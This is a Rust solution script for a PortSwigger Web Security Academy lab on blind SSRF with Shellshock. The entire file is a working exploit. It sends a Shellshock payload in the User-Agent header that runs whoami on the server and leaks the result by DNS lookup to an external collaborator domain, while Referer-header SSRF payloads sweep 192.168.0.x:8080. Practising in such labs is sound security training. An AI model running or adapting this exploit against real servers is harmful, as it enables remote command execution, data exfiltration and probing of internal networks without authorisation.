/******************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 19/10/2023
*
* Lab: Blind SSRF with Shellshock exploitation
*
* Steps: 1. Inject shellshock payload into the User-Agent header to exfiltrate the 
*           OS user via DNS lookup
*        2. Inject SSRF payload into the Referer header to iterate over all private IPs
*        3. Check your burp collaborator for the OS user in the DNS lookup
*        4. Submit the solution
*
*******************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a0700ff03aad761844ff1fc0089007a.web-security-academy.net";

    // change this to your collaborator domain
    let collaborator = "kuibbfxwttl5ygcplbs15szgp7vyjt7i.oastify.com";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "⟪#⟫ Injection point:".blue(),
        "User Agent & Referer headers".yellow(),
    );

    // payload to exfiltrate the OS user via DNS lookup using shellshock exploitation
    let shellshock_payload =
        format!("() {{ 42;}};echo;/bin/nslookup $(/bin/whoami).{collaborator}");

    // iterate over all possible numbers
    for x in 0..255 {
        // payload to perform SSRF
        let payload = format!("http://192.168.0.{x}:8080");

        print!(
            "\r{} ({}).. ",
            "❯ Injecting shellshock payload with SSRF to all private IPs".white(),
            format!("192.168.0.{x}:8080").yellow()
        );
        io::stdout().flush();

        // fetch the page with the injected payload
        client
            .get(format!("{url}/product?productId=1"))
            .header("Referer", payload)
            .header("User-Agent", &shellshock_payload)
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload".red()
            ));

        print!("{}", "OK".green());
    }

    println!(
        "\n{}",
        "🗹 Check your burp collaborator for the OS user in the DNS lookup then submit the solution"
            .white()
            .bold()
    );
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
